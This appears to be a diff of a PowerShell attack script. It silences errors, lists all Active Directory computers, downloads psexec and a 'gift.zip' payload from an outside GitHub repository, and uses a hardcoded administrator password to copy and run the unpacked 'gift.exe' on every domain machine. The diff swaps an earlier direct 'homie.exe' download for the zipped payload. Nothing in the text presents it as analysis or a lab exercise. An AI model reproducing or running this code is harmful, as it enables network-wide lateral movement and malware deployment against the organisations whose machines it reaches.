@@ -2,5 +2,7 @@ $ErrorActionPreference="SilentlyContinue"
 cd $env:temp
 (Get-AdComputer -Filter *).Name | Out-File $env:temp\computers.txt; type $env:temp\computers.txt
 curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\psexec.exe
-curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\homie.exe
-Start-Process -FilePath '.\psexec.exe' -ArgumentList  '@$env:temp\computers.txt -u administrator -p Zxcv7890! -c homie.exe'
+curl https://github.com/d77juan/t3st1n6/raw/main/gift.zip -o $env:temp\gift.zip
+Expand-archive $env:temp\gift.zip .
+sleep 5
+Start-Process -FilePath '.\psexec.exe' -ArgumentList  '@$env:temp\computers.txt -u administrator -p Zxcv7890! -c $env:temp\gift.exe'
